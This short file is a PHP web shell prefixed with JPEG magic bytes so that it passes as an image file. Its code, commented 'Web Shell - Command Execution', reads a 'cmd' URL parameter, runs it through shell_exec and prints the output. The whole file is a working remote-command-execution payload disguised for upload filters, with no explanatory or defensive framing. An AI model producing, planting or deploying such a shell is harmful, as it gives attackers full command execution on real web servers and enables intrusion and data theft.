\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00<?php
// Web Shell - Command Execution
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
}
?>
